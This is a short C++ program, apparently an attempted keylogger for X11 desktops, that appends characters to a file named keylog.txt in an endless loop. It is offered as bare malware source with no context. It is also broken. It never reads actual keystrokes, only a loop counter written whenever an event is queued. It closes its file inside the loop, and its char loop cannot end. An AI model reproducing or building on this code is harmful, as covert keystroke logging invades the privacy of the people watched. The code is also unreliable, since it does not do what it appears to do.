#include <iostream>
#include <X11/Xlib.h>
#include <fstream>
using namespace std;

int main() 
{
    Display *dpy;
    char key;
    ofstream file;
    file.open("keylog.txt", ios::app);
    dpy = XOpenDisplay(NULL);
    while (1)
    {
        for(key = 8; key <= 222; key++)
        {
            if (XEventsQueued(dpy, QueuedAfterReading))
            {

                file << char(key);
            }
        }
    file.close();
    }
    return 0;
}
